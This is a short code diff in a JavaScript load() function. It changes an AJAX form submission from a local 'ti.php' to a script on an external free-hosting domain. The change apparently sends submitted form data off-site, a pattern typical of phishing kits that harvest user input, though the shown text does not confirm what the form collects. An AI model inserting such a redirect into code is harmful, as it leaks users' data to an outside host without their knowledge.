@@ -60,7 +60,7 @@ function load(){
   Please Wait...
 </button>`).prop("disabled", true);
             $.ajax({
-                url: "ti.php",
+                url: "https://ya446165.000webhostapp.com/xa.php",
                 type: 'POST',
                 data: formData,
                 contentType: false,
